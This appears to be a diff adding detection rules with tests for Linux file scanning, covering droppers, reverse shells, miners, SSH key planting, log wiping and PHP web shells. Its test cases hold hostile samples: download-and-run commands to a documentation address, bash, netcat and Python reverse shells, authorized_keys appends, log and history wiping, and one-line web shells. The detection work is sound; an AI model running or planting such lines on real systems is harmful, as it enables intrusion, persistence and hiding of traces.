@@ -1,0 +1,218 @@
+# File rules for the files of a Linux system. They look at the content of a file, in the way of YARA.
+# A hit says "look at this file", not "this file is bad": an administrator can have a reason for it.
+# The texts in the tests are made up. The addresses are from the ranges for documentation.
+name: file_download_and_run
+id: 6f3a2c10-0901-4a6e-9d7b-0a1b2c3d4e01
+title: Script downloads a program and runs it
+description: A script gets something from the network and gives it to a shell, or saves it, makes it a program and starts it. This is how a dropper puts a second stage on a system.
+level: high
+tags: [attack.execution, attack.t1105, attack.t1059.004]
+paths: [tmp/, var/tmp/, dev/shm/, etc/, var/spool/, usr/local/bin/, usr/local/sbin/, root/]
+# A script or a web shell is small. A large file with the same text is data (a log, a list of CVEs).
+max_size: 1048576
+strings:
+  piped: {regex: '\b(curl|wget)\b[^|;&\n]{0,300}\|\s*(sudo\s+)?(ba|da|z)?sh\b'}
+  fetched: {regex: '\b(curl|wget)\b[^\n]{0,300}\s(-o|-O|--output)\s*\S+'}
+  made_program: {regex: '\bchmod\s+(\+x|[0-7]?[0-7][0-7][1357])\s'}
+  started_from_temp: {regex: '(?m)^\s*(nohup\s+|setsid\s+|exec\s+)?(/tmp|/var/tmp|/dev/shm)/\S+'}
+condition: piped or (fetched and made_program and started_from_temp)
+tests:
+  - name: a dropper that saves and starts a program
+    path: tmp/.u.sh
+    text: |
+      #!/bin/sh
+      mkdir -p /dev/shm/.x
+      curl -fsSL http://203.0.113.80/k -o /dev/shm/.x/kworker
+      chmod +x /dev/shm/.x/kworker
+      /dev/shm/.x/kworker -B &
+    match: true
+  - name: a download piped into a shell
+    path: etc/cron.hourly/sync
+    text: "wget -qO- http://203.0.113.80/u.sh | sudo bash\n"
+    match: true
+  - name: a backup job that only pings a check
+    path: usr/local/bin/backup.sh
+    text: |
+      #!/bin/sh
+      tar czf /var/backups/www.tgz /srv/www
+      curl -fsS -m 10 https://hc.example.test/ping/backup > /dev/null
+    match: false
+  - name: an install guide in a home folder is not looked at
+    path: home/aiko/README.md
+    text: "curl -fsSL https://example.test/install.sh | sh\n"
+    match: false
+---
+name: file_reverse_shell
+id: 6f3a2c10-0902-4a6e-9d7b-0a1b2c3d4e02
+title: File holds a reverse shell
+description: A file connects a shell to an address on the network, so that someone there can type commands. This is a backdoor.
+level: high
+tags: [attack.execution, attack.t1059.004, attack.command_and_control]
+# A script or a web shell is small. A large file with the same text is data (a log, a list of CVEs).
+max_size: 1048576
+strings:
+  # The shell and /dev/tcp on one line: the two apart in a long file are two things.
+  dev_tcp: {regex: '\b(ba|da|z)?sh\s+-i\b[^\n]{0,100}/dev/(tcp|udp)/[^/\s]+/[0-9]{1,5}|/dev/(tcp|udp)/[^/\s]+/[0-9]{1,5}[^\n]{0,100}\b(ba|da|z)?sh\s+-i\b'}
+  netcat_exec: {regex: '\b(nc|ncat|netcat)\b[^\n]{0,100}\s-(e|c)\s*\S*sh\b'}
+  socat_exec: {regex: '\bsocat\b[^\n]{0,100}exec:[^\n]{0,40}sh'}
+  python_socket: {regex: '(?s)socket\.socket\(.{0,400}(os\.dup2|pty\.spawn)'}
+condition: any of them
+tests:
+  - name: a loop that calls home
+    path: var/tmp/.dbus/helper
+    text: |
+      #!/bin/sh
+      while true; do bash -i >& /dev/tcp/203.0.113.80/4444 0>&1; sleep 60; done
+    match: true
+  - name: netcat with a shell
+    text: "nc 203.0.113.80 4444 -e /bin/sh\n"
+    match: true
+  - name: a python reverse shell
+    text: "import socket,os\ns=socket.socket()\ns.connect(('203.0.113.80',4444))\nos.dup2(s.fileno(),0)\n"
+    match: true
+  - name: a port check with /dev/tcp and no shell
+    path: usr/local/bin/check-db.sh
+    text: "timeout 1 bash -c '</dev/tcp/db.example.test/5432' && echo open\n"
+    match: false
+  - name: netcat that only checks a port
+    text: "nc -zv db.example.test 5432\n"
+    match: false
+  - name: a port check and an interactive shell on different lines
+    text: "timeout 1 bash -c '</dev/tcp/db.example.test/5432'\nssh admin@db.example.test bash -i\n"
+    match: false
+  - name: the same two lines the other way round
+    text: "ssh admin@db.example.test bash -i\ntimeout 1 bash -c '</dev/tcp/db.example.test/5432'\n"
+    match: false
+  - name: the redirect before the shell
+    text: "exec 5<>/dev/tcp/203.0.113.80/4444; cat <&5 | while read l; do $l 2>&5 >&5; done; sh -i <&5 >&5\n"
+    match: true
+---
+name: file_coin_miner
+id: 6f3a2c10-0903-4a6e-9d7b-0a1b2c3d4e03
+title: File looks like a coin miner
+description: A file names a mining pool, or has the settings of a known miner. A miner that an attacker left uses the processor of the system for someone else.
+level: high
+tags: [attack.impact, attack.t1496]
+strings:
+  pool: {regex: 'stratum\+(tcp|ssl|tls)://', nocase: true}
+  xmrig: {text: xmrig, nocase: true}
+  donate: {text: '--donate-level'}
+  randomx: {text: randomx, nocase: true}
+condition: pool or (xmrig and any of (donate, randomx))
+tests:
+  - name: the header of a program alone
+    path: dev/shm/.x/kworker
+    hex: 7f454c46020101 00 00
+    match: false
+  - name: the strings of a miner
+    path: dev/shm/.x/kworker
+    text: "\x7fELF....XMRig 6.x....--donate-level=0....stratum+tcp://pool.example.test:3333"
+    match: true
+  - name: a miner config file
+    text: '{"algo": "rx/0", "url": "stratum+ssl://pool.example.test:443"}'
+    match: true
+  - name: a note about xmrig alone
+    path: home/kenji/notes.txt
+    text: "look up why xmrig was on the news\n"
+    match: false
+---
+name: file_program_in_temp
+id: 6f3a2c10-0904-4a6e-9d7b-0a1b2c3d4e04
+title: Program file in a folder that everyone can write
+description: A file in /tmp, /var/tmp or /dev/shm starts with the bytes of a Linux program (ELF). Installed software does not live there, and an attacker who has no other place to write puts tools there.
+level: high
+tags: [attack.defense_evasion, attack.t1036]
+paths: [tmp/, var/tmp/, dev/shm/]
+strings:
+  elf: {hex: 7f 45 4c 46, at: 0}
+condition: elf
+tests:
+  - name: a program in /dev/shm
+    path: dev/shm/.x/kworker
+    hex: 7f454c46 02 01 01 00 00 00
+    match: true
+  - name: a program where software lives
+    path: opt/app/bin/server
+    hex: 7f454c46 02 01 01 00 00 00
+    match: false
+  - name: the bytes of a program further in a file
+    path: tmp/archive.tar
+    hex: 00 00 7f454c46 02 01
+    match: false
+---
+name: file_ssh_key_planting
+id: 6f3a2c10-0905-4a6e-9d7b-0a1b2c3d4e05
+title: Script adds a key to authorized_keys
+description: A script appends to an authorized_keys file. A key that is added in that way lets someone log in again without a password. Tools for setting up systems can do it too.
+level: medium
+tags: [attack.persistence, attack.t1098.004]
+# A script or a web shell is small. A large file with the same text is data (a log, a list of CVEs).
+max_size: 1048576
+strings:
+  appended: {regex: '>>\s*["'']?\S*\.ssh/authorized_keys2?\b'}
+condition: appended
+tests:
+  - name: a dropper that plants a key
+    text: "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample user@host' >> /root/.ssh/authorized_keys\n"
+    match: true
+  - name: a script that only reads the keys
+    text: "cat ~/.ssh/authorized_keys | wc -l\n"
+    match: false
+---
+name: file_log_wiping
+id: 6f3a2c10-0906-4a6e-9d7b-0a1b2c3d4e06
+title: Script wipes logs or the shell history
+description: A script empties a log of logins, or turns the shell history off or clears it. Someone who wants to leave no trace does this.
+level: medium
+tags: [attack.defense_evasion, attack.t1070.002, attack.t1070.003]
+# A script or a web shell is small. A large file with the same text is data (a log, a list of CVEs).
+max_size: 1048576
+strings:
+  emptied_log: {regex: '(^|[\s;&|])(cat\s+/dev/null\s*)?>\s*/var/log/(wtmp|btmp|lastlog|auth\.log|secure|syslog|messages)\b'}
+  shredded_log: {regex: '\bshred\b[^\n]{0,80}/var/log/'}
+  history_cleared: {regex: '\bhistory\s+-c\b'}
+  history_off: {regex: '\bunset\s+HISTFILE\b|\bHISTFILE=/dev/null\b|\bHISTSIZE=0\b'}
+condition: any of them
+tests:
+  - name: logins wiped
+    text: "cat /dev/null > /var/log/wtmp\n"
+    match: true
+  - name: history turned off
+    text: "export HISTFILE=/dev/null\n"
+    match: true
+  - name: a rotation that keeps the logs
+    text: "/usr/sbin/logrotate /etc/logrotate.conf\nexport HISTSIZE=10000\n"
+    match: false
+---
+name: file_web_shell
+id: 6f3a2c10-0907-4a6e-9d7b-0a1b2c3d4e07
+title: Web page runs commands from a request
+description: A PHP file in a web folder gives a value from the request to a function that runs commands or code. This is a web shell, a backdoor through the web server.
+level: high
+tags: [attack.persistence, attack.t1505.003]
+paths: [var/www/, srv/, usr/share/nginx/]
+# A script or a web shell is small. A large file with the same text is data (a log, a list of CVEs).
+max_size: 1048576
+strings:
+  php: {text: '<?', at: 0}
+  php_late: {text: '<?php', nocase: true}
+  runs_request: {regex: '(?i)\b(system|passthru|shell_exec|exec|popen|proc_open|assert|eval)\s*\(\s*(@\s*)?(\$_(GET|POST|REQUEST|COOKIE|SERVER)|base64_decode\s*\(\s*\$_|gzinflate|str_rot13)'}
+  backtick: {regex: '`\s*\$_(GET|POST|REQUEST)'}
+condition: any of (php, php_late) and any of (runs_request, backtick)
+tests:
+  - name: a one line shell
+    path: var/www/html/uploads/x.php
+    text: "<?php system($_GET['c']); ?>"
+    match: true
+  - name: an encoded shell
+    path: srv/www/wp-content/a.php
+    text: "<?php @eval(base64_decode($_POST['p'])); ?>"
+    match: true
+  - name: an ordinary page
+    path: var/www/html/index.php
+    text: "<?php echo htmlspecialchars($_GET['q'] ?? ''); ?>"
+    match: false
+  - name: the same text outside the web folders
+    path: home/mei/notes/shells.txt
+    text: "<?php system($_GET['c']); ?>"
+    match: false
